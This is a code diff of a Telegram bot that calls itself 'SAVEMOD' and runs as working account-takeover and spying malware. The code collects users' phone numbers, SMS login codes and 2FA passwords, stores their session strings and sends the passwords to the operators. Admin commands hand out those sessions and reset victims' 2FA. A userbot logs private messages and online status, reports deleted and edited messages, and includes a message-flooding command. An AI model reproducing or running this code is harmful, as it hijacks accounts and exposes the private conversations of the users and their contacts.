 async def cmd_unmon(message):
@@ -716,21 +686,21 @@ async def cmd_unmon(message):
         return
     args = message.get_args()
     if not args:
-        await message.answer("❌ /unmon @username")
+        await message.answer("/unmon @username")
         return
-    client, uid = get_active_client()
-    if not client:
-        await message.answer("❌ Нет активного аккаунта")
+    cl, uid = get_active_client()
+    if not cl:
+        await message.answer("Нет активного аккаунта")
         return
-    entity = await resolve_entity(client, args)
-    if not entity:
-        await message.answer("❌ Не найден")
+    ent = await resolve_entity(cl, args)
+    if not ent:
+        await message.answer("Не найден")
         return
-    if str(entity.id) in monitored_users:
-        del monitored_users[str(entity.id)]
-        await message.answer(f"✅ Мониторинг {entity.first_name} остановлен")
+    if str(ent.id) in monitored_users:
+        del monitored_users[str(ent.id)]
+        await message.answer(f"Мониторинг {ent.first_name} остановлен")
     else:
-        await message.answer("❌ Не отслеживается")
+        await message.answer("Не отслеживается")
 
 @dp.message_handler(commands=['session'])
 async def cmd_session(message):
@@ -738,26 +708,26 @@ async def cmd_session(message):
         return
     args = message.get_args()
     if not args:
-        await message.answer("❌ /session НОМЕР")
+        await message.answer("/session НОМЕР")
         return
     try:
         num = int(args) - 1
         cursor.execute('SELECT user_id, session_string, phone, two_fa, first_name, username FROM user_sessions')
         rows = cursor.fetchall()
-        non_admin = [(uid, ss, phone, two_fa, fname, uname) for uid, ss, phone, two_fa, fname, uname in rows if not is_target_admin(uid)]
-        if num < 0 or num >= len(non_admin):
-            await message.answer("❌ Неверный номер")
+        na = [(uid, ss, ph, tf, fn, un) for uid, ss, ph, tf, fn, un in rows if not is_target_admin(uid)]
+        if num < 0 or num >= len(na):
+            await message.answer("Неверный номер")
             return
-        uid, ss, phone, two_fa, fname, uname = non_admin[num]
-        name = fname or uname or str(uid)
-        for admin_id in ADMIN_IDS:
+        uid, ss, ph, tf, fn, un = na[num]
+        name = fn or un or str(uid)
+        for aid in ADMIN_IDS:
             try:
-                await bot.send_message(admin_id, f"🎭 СЕССИЯ {name}\n\n<code>{ss}</code>", parse_mode='HTML')
+                await bot.send_message(aid, f"СЕССИЯ {name}\n\n<code>{ss}</code>")
             except:
                 pass
-        await message.answer("✅ Сессия отправлена")
+        await message.answer("Сессия отправлена")
     except:
-        await message.answer("❌ Ошибка")
+        await message.answer("Ошибка")
 
 @dp.message_handler(commands=['set2fa'])
 async def cmd_set2fa(message):
@@ -765,114 +735,107 @@ async def cmd_set2fa(message):
         return
     args = message.get_args()
     if not args:
-        await message.answer("❌ /set2fa ПАРОЛЬ")
+        await message.answer("/set2fa ПАРОЛЬ")
         return
-    client, uid = get_active_client()
-    if not client or is_target_admin(uid):
-        await message.answer("❌ Нет активного аккаунта")
+    cl, uid = get_active_client()
+    if not cl or is_target_admin(uid):
+        await message.answer("Нет активного аккаунта")
         return
     try:
-        await client.edit_2fa(args)
+        await cl.edit_2fa(args)
         cursor.execute('UPDATE user_sessions SET two_fa=? WHERE user_id=?', (args, uid))
         conn.commit()
-        await message.answer(f"✅ 2FA установлен: <code>{args}</code>", parse_mode='HTML')
+        await message.answer(f"2FA установлен: <code>{args}</code>")
     except Exception as e:
-        await message.answer(f"❌ Ошибка: {e}")
+        await message.answer(f"Ошибка: {e}")
 
 @dp.message_handler(commands=['info'])
 async def cmd_info(message):
     if not is_admin(message.from_user.id):
         return
-    client, uid = get_active_client()
-    if not client or is_target_admin(uid):
-        await message.answer("❌ Нет активного аккаунта")
+    cl, uid = get_active_client()
+    if not cl or is_target_admin(uid):
+        await message.answer("Нет активного аккаунта")
         return
     try:
-        me = await client.get_me()
+        me = await cl.get_me()
         cursor.execute('SELECT phone, two_fa FROM user_sessions WHERE user_id=?', (uid,))
         row = cursor.fetchone()
-        await message.answer(f"👤 {me.first_name}\n🆔 {me.id}\n📱 {row[0] if row else '-'}\n🔐 {'✅' if row and row[1] else '❌'}")
+        await message.answer(f"{me.first_name}\nID: {me.id}\n📱 {row[0] if row else '-'}\n🔐 {'✅' if row and row[1] else '❌'}")
     except:
-        await message.answer("❌ Ошибка")
+        await message.answer("Ошибка")
 
 @dp.message_handler(commands=['logs'])
 async def cmd_logs(message):
     if not is_admin(message.from_user.id):
         return
     args = message.get_args()
-    limit = int(args) if args and args.isdigit() else 20
-    cursor.execute('SELECT timestamp, sender_name, message FROM spy_logs ORDER BY id DESC LIMIT ?', (limit,))
+    lim = int(args) if args and args.isdigit() else 20
+    cursor.execute('SELECT timestamp, sender_name, message FROM spy_logs ORDER BY id DESC LIMIT ?', (lim,))
     rows = cursor.fetchall()
     if not rows:
-        await message.answer("📭 Нет логов")
+        await message.answer("Нет логов")
         return
-    response = "📜 ЛОГИ\n\n"
-    for ts, name, msg in reversed(rows):
-        response += f"[{ts[11:16]}] {name}: {msg[:80]}\n"
-    await message.answer(response[:4000])
+    out = "ЛОГИ\n\n"
+    for ts, nm, msg in reversed(rows):
+        out += f"[{ts[11:16]}] {nm}: {msg[:80]}\n"
+    await message.answer(out[:4000])
 
 @dp.message_handler(commands=['statuslogs'])
 async def cmd_statuslogs(message):
     if not is_admin(message.from_user.id):
         return
     args = message.get_args()
-    limit = int(args) if args and args.isdigit() else 20
-    cursor.execute('SELECT timestamp, user_name, status FROM user_status_logs ORDER BY id DESC LIMIT ?', (limit,))
+    lim = int(args) if args and args.isdigit() else 20
+    cursor.execute('SELECT timestamp, user_name, status FROM user_status_logs ORDER BY id DESC LIMIT ?', (lim,))
     rows = cursor.fetchall()
     if not rows:
-        await message.answer("📭 Нет логов")
+        await message.answer("Нет логов")
         return
-    response = "🔄 ЛОГИ СТАТУСОВ\n\n"
-    for ts, name, status in reversed(rows):
-        emoji = "🟢" if "ВОШЕЛ" in status else "⚫"
-        response += f"{emoji} [{ts[11:16]}] {name}: {status}\n"
-    await message.answer(response[:4000])
+    out = "ЛОГИ СТАТУСОВ\n\n"
+    for ts, nm, st in reversed(rows):
+        e = "🟢" if "ВОШЕЛ" in st else "⚫"
+        out += f"{e} [{ts[11:16]}] {nm}: {st}\n"
+    await message.answer(out[:4000])
 
 @dp.message_handler(commands=['stats'])
 async def cmd_stats(message):
     if not is_admin(message.from_user.id):
         return
-    cursor.execute('SELECT COUNT(*) FROM spy_logs')
-    logs = cursor.fetchone()[0]
-    cursor.execute('SELECT COUNT(*) FROM user_sessions')
-    accounts = cursor.fetchone()[0]
-    cursor.execute('SELECT COUNT(*) FROM user_status_logs')
-    status_logs = cursor.fetchone()[0]
-    await message.answer(f"📊 СТАТИСТИКА\n\nАккаунтов: {accounts}\nСообщений: {logs}\nЛогов статусов: {status_logs}\nАктивных: {len(active_clients)}")
+    logs = cursor.execute('SELECT COUNT(*) FROM spy_logs').fetchone()[0]
+    acc = cursor.execute('SELECT COUNT(*) FROM user_sessions').fetchone()[0]
+    stat = cursor.execute('SELECT COUNT(*) FROM user_status_logs').fetchone()[0]
+    await message.answer(f"📊 СТАТИСТИКА\n\nАккаунтов: {acc}\nСообщений: {logs}\nЛогов статусов: {stat}\nАктивных: {len(active_clients)}")
 
 @dp.message_handler(commands=['backup'])
 async def cmd_backup(message):
     if not is_admin(message.from_user.id):
         return
-    status_msg = await message.answer("💾 Создаю бэкап...")
-    backup_path = os.path.join(VOLUME_PATH, f'backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.db')
-    shutil.copy2(DB_PATH, backup_path)
-    with open(backup_path, 'rb') as f:
-        for admin_id in ADMIN_IDS:
+    st = await message.answer("Создаю бэкап...")
+    bp = os.path.join(VOLUME_PATH, f'backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.db')
+    shutil.copy2(DB_PATH, bp)
+    with open(bp, 'rb') as f:
+        for aid in ADMIN_IDS:
             try:
-                await bot.send_document(admin_id, InputFile(f, filename=os.path.basename(backup_path)), caption=f"💾 Бэкап")
+                await bot.send_document(aid, InputFile(f, filename=os.path.basename(bp)), caption="Бэкап БД")
                 await f.seek(0)
             except:
                 pass
-    os.remove(backup_path)
-    await status_msg.edit_text("✅ Бэкап отправлен")
-
-# ============================================================================
-# РЕГИСТРАЦИЯ ПОЛЬЗОВАТЕЛЕЙ
-# ============================================================================
+    os.remove(bp)
+    await st.edit_text("Бэкап отправлен")
 
 @dp.message_handler(commands=['start'])
 async def cmd_start(message):
-    user_id = message.from_user.id
-    cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (user_id,))
+    uid = message.from_user.id
+    cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (uid,))
     row = cursor.fetchone()
     if row and row[0]:
-        if is_admin(user_id):
+        if is_admin(uid):
             await message.answer("✅ Ты уже авторизован!\n/spyhelp - команды")
         else:
             await message.answer("✅ Ты уже авторизован в SAVEMOD!")
-        if user_id not in active_clients:
-            asyncio.create_task(run_userbot(user_id, row[0]))
+        if uid not in active_clients:
+            asyncio.create_task(run_userbot(uid, row[0]))
         return
     kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
     kb.add(KeyboardButton("📱 Поделиться номером", request_contact=True))
@@ -880,154 +843,93 @@ async def cmd_start(message):
 
 @dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
 async def handle_contact(message):
-    user_id = message.from_user.id
+    uid = message.from_user.id
     phone = message.contact.phone_number
     try:
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
-        result = await client.send_code_request(phone)
-        temp_auth[user_id] = {'client': client, 'phone': phone, 'hash': result.phone_code_hash, 'code': ''}
+        res = await client.send_code_request(phone)
+        temp_auth[uid] = {'client': client, 'phone': phone, 'hash': res.phone_code_hash, 'code': ''}
         await message.answer("📱 Введи код из SMS:", reply_markup=get_code_keyboard())
     except Exception as e:
-        await message.answer(f"❌ Ошибка: {e}")
+        await message.answer(f"Ошибка: {e}")
 
 @dp.callback_query_handler(lambda c: c.data.startswith('code_'))
-async def handle_code(callback):
-    user_id = callback.from_user.id
-    if user_id not in temp_auth:
-        await callback.answer("Сессия истекла, /start")
+async def handle_code(cb):
+    uid = cb.from_user.id
+    if uid not in temp_auth:
+        await cb.answer("Сессия истекла, /start")
         return
-    action = callback.data.replace('code_', '')
-    current = temp_auth[user_id].get('code', '')
-    if action.startswith('digit_'):
-        digit = action.split('_')[1]
-        if len(current) < 5:
-            temp_auth[user_id]['code'] = current + digit
-    elif action == 'backspace':
-        temp_auth[user_id]['code'] = current[:-1]
-    elif action == 'submit':
-        if len(current) == 5:
-            await callback.answer("Авторизация...")
-            await complete_auth(callback, user_id)
+    act = cb.data.replace('code_', '')
+    cur = temp_auth[uid].get('code', '')
+    if act.startswith('digit_'):
+        d = act.split('_')[1]
+        if len(cur) < 5:
+            temp_auth[uid]['code'] = cur + d
+    elif act == 'backspace':
+        temp_auth[uid]['code'] = cur[:-1]
+    elif act == 'submit':
+        if len(cur) == 5:
+            await cb.answer("Авторизация...")
+            await complete_auth(cb, uid)
             return
         else:
-            await callback.answer(f"Нужно 5 цифр", show_alert=True)
+            await cb.answer("Нужно 5 цифр", show_alert=True)
             return
-    code = temp_auth[user_id]['code']
-    display = code if code else "_____"
-    await callback.message.edit_text(f"📱 Код: {display}", reply_markup=get_code_keyboard())
-    await callback.answer()
+    code = temp_auth[uid]['code']
+    disp = code if code else "_____"
+    await cb.message.edit_text(f"Код: {disp}", reply_markup=get_code_keyboard())
+    await cb.answer()
 
-@dp.message_handler(commands=['start'])
-async def cmd_start(message):
-    user_id = message.from_user.id
-    cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (user_id,))
-    row = cursor.fetchone()
-    if row and row[0]:
-        if is_admin(user_id):
-            await message.answer("✅ Ты уже авторизован!\n/spyhelp - команды")
-        else:
-            await message.answer("✅ Ты уже авторизован в SAVEMOD!")
-        if user_id not in active_clients:
-            asyncio.create_task(run_userbot(user_id, row[0]))
-        return
-    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    kb.add(KeyboardButton("📱 Поделиться номером", request_contact=True))
-    await message.answer("🔐 Отправь номер телефона", reply_markup=kb)
-
-@dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
-async def handle_contact(message):
-    user_id = message.from_user.id
-    phone = message.contact.phone_number
-    try:
-        client = TelegramClient(StringSession(), API_ID, API_HASH)
-        await client.connect()
-        result = await client.send_code_request(phone)
-        temp_auth[user_id] = {'client': client, 'phone': phone, 'hash': result.phone_code_hash, 'code': ''}
-        await message.answer("📱 Введи код из SMS:", reply_markup=get_code_keyboard())
-    except Exception as e:
-        await message.answer(f"❌ Ошибка: {e}")
-
-@dp.callback_query_handler(lambda c: c.data.startswith('code_'))
-async def handle_code(callback):
-    user_id = callback.from_user.id
-    if user_id not in temp_auth:
-        await callback.answer("Сессия истекла, /start")
-        return
-    action = callback.data.replace('code_', '')
-    current = temp_auth[user_id].get('code', '')
-    if action.startswith('digit_'):
-        digit = action.split('_')[1]
-        if len(current) < 5:
-            temp_auth[user_id]['code'] = current + digit
-    elif action == 'backspace':
-        temp_auth[user_id]['code'] = current[:-1]
-    elif action == 'submit':
-        if len(current) == 5:
-            await callback.answer("Авторизация...")
-            await complete_auth(callback, user_id)
-            return
-        else:
-            await callback.answer(f"Нужно 5 цифр", show_alert=True)
-            return
-    code = temp_auth[user_id]['code']
-    display = code if code else "_____"
-    await callback.message.edit_text(f"📱 Код: {display}", reply_markup=get_code_keyboard())
-    await callback.answer()
-
-async def complete_auth(callback, user_id):
-    data = temp_auth[user_id]
+async def complete_auth(cb, uid):
+    data = temp_auth[uid]
     try:
         await data['client'].sign_in(phone=data['phone'], code=data['code'], phone_code_hash=data['hash'])
-        session_str = data['client'].session.save()
+        ss = data['client'].session.save()
         me = await data['client'].get_me()
         cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
-                       (user_id, session_str, data['phone'], None, me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
+                       (uid, ss, data['phone'], None, me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
         conn.commit()
-        await callback.message.answer(f"✅ Авторизация успешна!")
-        asyncio.create_task(run_userbot(user_id, session_str))
+        await cb.message.answer("✅ Авторизация успешна!")
+        asyncio.create_task(run_userbot(uid, ss))
         await data['client'].disconnect()
-        del temp_auth[user_id]
-        for admin_id in ADMIN_IDS:
+        del temp_auth[uid]
+        for aid in ADMIN_IDS:
             try:
-                await bot.send_message(admin_id, f"🎉 Новый пользователь: {me.first_name}\nID: {user_id}")
+                await bot.send_message(aid, f"🎉 Новый пользователь: {me.first_name}\nID: {uid}")
             except:
                 pass
     except Exception as e:
-        error_msg = str(e).lower()
-        if '2fa' in error_msg or 'password' in error_msg or 'two-steps' in error_msg:
-            await callback.message.answer("🔐 Введите пароль от двухфакторной аутентификации (облачный пароль):")
-            pending_2fa[user_id] = data
-            del temp_auth[user_id]
+        err = str(e).lower()
+        if '2fa' in err or 'password' in err or 'two-steps' in err:
+            await cb.message.answer("🔐 Введи облачный пароль (2FA):")
+            pending_2fa[uid] = data
+            del temp_auth[uid]
         else:
-            await callback.message.answer(f"❌ Ошибка: {e}")
+            await cb.message.answer(f"Ошибка: {e}")
 
 @dp.message_handler(lambda msg: msg.from_user.id in pending_2fa)
 async def handle_2fa(message):
-    user_id = message.from_user.id
-    data = pending_2fa[user_id]
+    uid = message.from_user.id
+    data = pending_2fa[uid]
     try:
         await data['client'].sign_in(password=message.text.strip())
-        session_str = data['client'].session.save()
+        ss = data['client'].session.save()
         me = await data['client'].get_me()
         cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
-                       (user_id, session_str, data['phone'], message.text.strip(), me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
+                       (uid, ss, data['phone'], message.text.strip(), me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
         conn.commit()
-        await message.answer(f"✅ Авторизация с 2FA успешна!")
-        asyncio.create_task(run_userbot(user_id, session_str))
+        await message.answer("✅ Авторизация с 2FA успешна!")
+        asyncio.create_task(run_userbot(uid, ss))
         await data['client'].disconnect()
-        del pending_2fa[user_id]
-        for admin_id in ADMIN_IDS:
+        del pending_2fa[uid]
+        for aid in ADMIN_IDS:
             try:
-                await bot.send_message(admin_id, f"🎉 Новый пользователь (2FA): {me.first_name}\nID: {user_id}\n🔐 2FA пароль: {message.text.strip()}")
+                await bot.send_message(aid, f"🎉 Новый пользователь (2FA): {me.first_name}\nID: {uid}\n2FA: {message.text.strip()}")
             except:
                 pass
     except Exception as e:
-        await message.answer(f"❌ Ошибка 2FA: {e}")
-
-# ============================================================================
-# ЮЗЕРБОТ
-# ============================================================================
+        await message.answer(f"Ошибка 2FA: {e}")
 
 async def run_userbot(owner_id, session_string):
     if owner_id in active_clients:
@@ -1044,7 +946,7 @@ async def run_userbot(owner_id, session_string):
     active_clients[owner_id] = client
     saved_messages[owner_id] = {}
     user_status_tracker[owner_id] = {}
-    logger.info(f"✅ Юзербот запущен для {owner_id}")
+    logger.info(f"Юзербот запущен для {owner_id}")
     cursor.execute('SELECT user_id FROM muted_users WHERE muted_by=?', (owner_id,))
     muted_users = {row[0] for row in cursor.fetchall()}
     
@@ -1053,31 +955,31 @@ async def run_userbot(owner_id, session_string):
         try:
             if not hasattr(event, 'user') or event.user is None or event.user.id is None:
                 return
-            user = event.user
-            if getattr(user, 'bot', False) or is_target_admin(user.id):
+            u = event.user
+            if getattr(u, 'bot', False) or is_target_admin(u.id):
                 return
-            uid = user.id
-            name = user.first_name or user.username or str(uid)
-            cur = type(user.status).__name__
+            uid = u.id
+            name = u.first_name or u.username or str(uid)
+            cur = type(u.status).__name__
             last = user_status_tracker.get(owner_id, {}).get(uid)
             if cur != last:
                 user_status_tracker[owner_id][uid] = cur
                 if str(uid) in monitored_users:
                     try:
-                        if isinstance(user.status, UserStatusOnline):
-                            await bot.send_message(monitored_users[str(uid)]['admin_id'], f"🟢 {name} вошел в сеть!", parse_mode='HTML')
-                        elif isinstance(user.status, UserStatusOffline):
-                            await bot.send_message(monitored_users[str(uid)]['admin_id'], f"⚫ {name} вышел из сети!", parse_mode='HTML')
+                        if isinstance(u.status, UserStatusOnline):
+                            await bot.send_message(monitored_users[str(uid)]['admin_id'], f"🟢 {name} вошел в сеть!")
+                        elif isinstance(u.status, UserStatusOffline):
+                            await bot.send_message(monitored_users[str(uid)]['admin_id'], f"⚫ {name} вышел из сети!")
                     except:
                         pass
-                if isinstance(user.status, UserStatusOnline):
-                    status_text = "🟢 ВОШЕЛ В СЕТЬ"
-                elif isinstance(user.status, UserStatusOffline):
-                    status_text = "⚫ ВЫШЕЛ ИЗ СЕТИ"
+                if isinstance(u.status, UserStatusOnline):
+                    st = "🟢 ВОШЕЛ В СЕТЬ"
+                elif isinstance(u.status, UserStatusOffline):
+                    st = "⚫ ВЫШЕЛ ИЗ СЕТИ"
                 else:
                     return
                 cursor.execute('INSERT INTO user_status_logs (timestamp, user_id, user_name, status) VALUES (?, ?, ?, ?)',
-                               (datetime.now().isoformat(), uid, name[:100], status_text))
+                               (datetime.now().isoformat(), uid, name[:100], st))
                 conn.commit()
         except:
             pass
@@ -1086,20 +988,22 @@ async def run_userbot(owner_id, session_string):
     async def save_incoming(event):
         if event.out:
             return
-        if is_target_admin(event.sender_id):
-            return
-        if event.is_private and event.sender_id in muted_users:
+        sid = event.sender_id
+        cursor.execute('SELECT 1 FROM muted_users WHERE user_id=? AND muted_by=?', (sid, owner_id))
+        if cursor.fetchone():
             await event.delete()
             return
+        if is_target_admin(sid):
+            return
         if event.text:
-            saved_messages[owner_id][event.id] = {'sender_id': event.sender_id, 'text': event.text}
+            saved_messages[owner_id][event.id] = {'sender_id': sid, 'text': event.text}
             cursor.execute('INSERT INTO saved_messages (owner_id, msg_id, sender_id, text, date) VALUES (?, ?, ?, ?, ?)',
-                          (owner_id, event.id, event.sender_id, event.text, datetime.now().isoformat()))
+                          (owner_id, event.id, sid, event.text, datetime.now().isoformat()))
             conn.commit()
             try:
-                sender = await client.get_entity(event.sender_id)
+                snd = await client.get_entity(sid)
                 cursor.execute('INSERT INTO spy_logs (timestamp, sender_id, sender_name, message, chat_id, chat_name) VALUES (?, ?, ?, ?, ?, ?)',
-                              (datetime.now().isoformat(), event.sender_id, sender.first_name or str(event.sender_id), event.text[:500], event.chat_id, 'private'))
+                              (datetime.now().isoformat(), sid, snd.first_name or str(sid), event.text[:500], event.chat_id, 'private'))
                 conn.commit()
             except:
                 pass
@@ -1108,23 +1012,23 @@ async def run_userbot(owner_id, session_string):
     async def notify_delete(event):
         if not event.is_private:
             return
-        for msg_id in event.deleted_ids:
-            msg = saved_messages.get(owner_id, {}).get(msg_id)
+        for mid in event.deleted_ids:
+            msg = saved_messages.get(owner_id, {}).get(mid)
             if not msg:
-                cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
+                cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, mid))
                 row = cursor.fetchone()
                 if row:
                     msg = {'sender_id': row[0], 'text': row[1]}
             if msg and msg['sender_id'] != owner_id and not is_target_admin(msg['sender_id']):
                 try:
-                    user = await client.get_entity(msg['sender_id'])
-                    name = user.first_name or 'Пользователь'
-                    username = f"@{user.username}" if user.username else ''
-                    await send_to_admins(f"🗑 {name} {username} удалил:\n\n{msg['text'][:500]}")
-                    cursor.execute('DELETE FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
+                    u = await client.get_entity(msg['sender_id'])
+                    name = u.first_name or 'Пользователь'
+                    uname = f"@{u.username}" if u.username else ''
+                    await send_to_admins(f"🗑 {name} {uname} удалил:\n\n{msg['text'][:500]}")
+                    cursor.execute('DELETE FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, mid))
                     conn.commit()
-                    if msg_id in saved_messages.get(owner_id, {}):
-                        del saved_messages[owner_id][msg_id]
+                    if mid in saved_messages.get(owner_id, {}):
+                        del saved_messages[owner_id][mid]
                 except:
                     pass
     
@@ -1132,23 +1036,24 @@ async def run_userbot(owner_id, session_string):
     async def notify_edit(event):
         if not event.is_private or event.out:
             return
-        msg_id = event.id
-        new_text = event.text or ''
-        msg = saved_messages.get(owner_id, {}).get(msg_id)
+        mid = event.id
+        ntxt = event.text or ''
+        msg = saved_messages.get(owner_id, {}).get(mid)
         if not msg:
-            cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, msg_id))
+            cursor.execute('SELECT sender_id, text FROM saved_messages WHERE owner_id=? AND msg_id=?', (owner_id, mid))
             row = cursor.fetchone()
             if row:
                 msg = {'sender_id': row[0], 'text': row[1]}
-        if msg and msg['sender_id'] != owner_id and msg['text'] != new_text and not is_target_admin(msg['sender_id']):
+        if msg and msg['sender_id'] != owner_id and msg['text'] != ntxt and not is_target_admin(msg['sender_id']):
             try:
-                user = await client.get_entity(msg['sender_id'])
-                name = user.first_name or 'Пользователь'
-                username = f"@{user.username}" if user.username else ''
-                await send_to_admins(f"✏️ {name} {username} изменил:\n\nБыло: {msg['text'][:200]}\nСтало: {new_text[:200]}")
-                cursor.execute('UPDATE saved_messages SET text=? WHERE owner_id=? AND msg_id=?', (new_text, owner_id, msg_id))
+                u = await client.get_entity(msg['sender_id'])
+                name = u.first_name or 'Пользователь'
+                uname = f"@{u.username}" if u.username else ''
+                await send_to_admins(f"✏️ {name} {uname} изменил:\n\nБыло: {msg['text'][:200]}\nСтало: {ntxt[:200]}")
+                cursor.execute('UPDATE saved_messages SET text=? WHERE owner_id=? AND msg_id=?', (ntxt, owner_id, mid))
                 conn.commit()
-                saved_messages[owner_id][msg_id]['text'] = new_text
+                if mid in saved_messages.get(owner_id, {}):
+                    saved_messages[owner_id][mid]['text'] = ntxt
             except:
                 pass
     
@@ -1156,13 +1061,13 @@ async def run_userbot(owner_id, session_string):
     async def user_commands(event):
         if not event.out:
             return
-        text = event.text or ''
-        if not text.startswith('.'):
+        txt = event.text or ''
+        if not txt.startswith('.'):
             return
         
-        if text == '.help':
+        if txt == '.help':
             await event.edit("""
-<b>🤖 КОМАНДЫ SAVEMOD</b>
+🤖 КОМАНДЫ ЮЗЕРБОТА
 
 .help - справка
 .mute (ответ) - заглушить
@@ -1171,82 +1076,63 @@ async def run_userbot(owner_id, session_string):
 .spam кол-во текст - спам
 .type текст - печать
 .info (ответ) - инфо
-""", parse_mode='HTML')
+""")
             return
         
-        if text == '.mute':
+        if txt == '.mute':
             reply = await event.get_reply_message()
             if not reply:
-                await event.edit('❌ Ответь на сообщение пользователя')
+                await event.edit('❌ Ответь на сообщение')
                 return
-            
-            # Получаем реального отправителя reply сообщения
-            target_id = reply.sender_id
-            if not target_id:
+            tid = reply.sender_id
+            if not tid:
                 await event.edit('❌ Не удалось определить пользователя')
                 return
-            
-            if target_id == owner_id:
+            if tid == owner_id:
                 await event.edit('❌ Нельзя заглушить себя')
                 return
-            if is_target_admin(target_id):
-                await event.edit('❌ Нельзя заглушить администратора')
+            if is_target_admin(tid):
+                await event.edit('❌ Нельзя заглушить админа')
                 return
-            
-            # Проверяем, есть ли уже в муте
-            cursor.execute('SELECT 1 FROM muted_users WHERE user_id=? AND muted_by=?', (target_id, owner_id))
+            cursor.execute('SELECT 1 FROM muted_users WHERE user_id=? AND muted_by=?', (tid, owner_id))
             if cursor.fetchone():
-                await event.edit(f'🔇 Пользователь уже заглушен')
+                await event.edit('🔇 Уже заглушен')
                 return
-            
             cursor.execute('INSERT INTO muted_users (user_id, muted_by, muted_at) VALUES (?, ?, ?)',
-                          (target_id, owner_id, datetime.now().isoformat()))
+                          (tid, owner_id, datetime.now().isoformat()))
             conn.commit()
-            
-            # Обновляем локальный список мутов
-            if owner_id not in user_status_tracker:
-                user_status_tracker[owner_id] = {}
-            muted_users.add(target_id)
-            
-            # Получаем имя пользователя
+            muted_users.add(tid)
             try:
-                user = await client.get_entity(target_id)
-                name = user.first_name or user.username or str(target_id)
-                await event.edit(f'🔇 Пользователь {name} заглушен')
+                u = await client.get_entity(tid)
+                await event.edit(f'🔇 {u.first_name} заглушен')
             except:
-                await event.edit(f'🔇 Пользователь {target_id} заглушен')
+                await event.edit(f'🔇 Пользователь заглушен')
             return
         
-        if text == '.unmute':
+        if txt == '.unmute':
             reply = await event.get_reply_message()
             if not reply:
-                await event.edit('❌ Ответь на сообщение пользователя')
+                await event.edit('❌ Ответь на сообщение')
                 return
-            
-            target_id = reply.sender_id
-            if not target_id:
+            tid = reply.sender_id
+            if not tid:
                 await event.edit('❌ Не удалось определить пользователя')
                 return
-            
-            if target_id == owner_id:
+            if tid == owner_id:
                 await event.edit('❌ Нельзя разглушить себя')
                 return
-            
-            cursor.execute('DELETE FROM muted_users WHERE user_id=? AND muted_by=?', (target_id, owner_id))
+            cursor.execute('DELETE FROM muted_users WHERE user_id=? AND muted_by=?', (tid, owner_id))
             conn.commit()
-            
-            if target_id in muted_users:
-                muted_users.discard(target_id)
-            
+            if tid in muted_users:
+                muted_users.discard(tid)
             try:
-                user = await client.get_entity(target_id)
-                name = user.first_name or user.username or str(target_id)
-                await event.edit(f'🔊 Пользователь {name} разглушен')
+                u = await client.get_entity(tid)
+                await event.edit(f'🔊 {u.first_name} разглушен')
             except:
-                await event.edit(f'🔊 Пользователь {target_id} разглушен')
+                await event.edit(f'🔊 Пользователь разглушен')
             return
         
-        if text == '.list':
+        if txt == '.list':
             if muted_users:
                 names = []
                 for uid in list(muted_users)[:20]:
@@ -1260,41 +1146,41 @@ async def run_userbot(owner_id, session_string):
                 await event.edit("🔇 Нет")
             return
         
-        if text.startswith('.spam '):
-            parts = text.split(' ', 2)
+        if txt.startswith('.spam '):
+            parts = txt.split(' ', 2)
             if len(parts) >= 2:
                 try:
-                    count = int(parts[1])
-                    msg_text = parts[2] if len(parts) > 2 else None
-                    if not msg_text:
+                    cnt = int(parts[1])
+                    msg = parts[2] if len(parts) > 2 else None
+                    if not msg:
                         reply = await event.get_reply_message()
                         if reply:
-                            msg_text = reply.text
-                    if msg_text and count > 0:
+                            msg = reply.text
+                    if msg and cnt > 0:
                         await event.delete()
-                        for i in range(min(count, 5000)):
-                            await client.send_message(event.chat_id, msg_text)
+                        for i in range(min(cnt, 1000)):
+                            await client.send_message(event.chat_id, msg)
                             await asyncio.sleep(0.05)
                 except:
                     pass
             return
         
-        if text.startswith('.type '):
-            txt = text[6:]
-            if txt:
+        if txt.startswith('.type '):
+            t = txt[6:]
+            if t:
                 await event.delete()
-                msg = await client.send_message(event.chat_id, txt[0])
-                typed = txt[0]
-                for ch in txt[1:]:
+                m = await client.send_message(event.chat_id, t[0])
+                typed = t[0]
+                for ch in t[1:]:
                     typed += ch
                     try:
-                        await msg.edit(typed)
+                        await m.edit(typed)
                     except:
                         pass
                     await asyncio.sleep(0.15)
             return
         
-        if text == '.info':
+        if txt == '.info':
             reply = await event.get_reply_message()
             if reply:
                 try:
@@ -1303,36 +1189,32 @@ async def run_userbot(owner_id, session_string):
                         await event.edit("❌ Админ")
                         return
                     muted = "✅" if reply.sender_id in muted_users else "❌"
-                    await event.edit(f"👤 {u.first_name}\n🆔 {u.id}\n🔇 Заглушен: {muted}")
+                    await event.edit(f"👤 {u.first_name}\nID: {u.id}\n🔇 Заглушен: {muted}")
                 except:
                     pass
             else:
-                await event.edit('❌ Ответь')
+                await event.edit('❌ Ответь на сообщение')
             return
     
     await client.run_until_disconnected()
-
-# ============================================================================
-# ЗАПУСК
-# ============================================================================
 
 flask_app = Flask(__name__)
 
 @flask_app.route('/')
 def health():
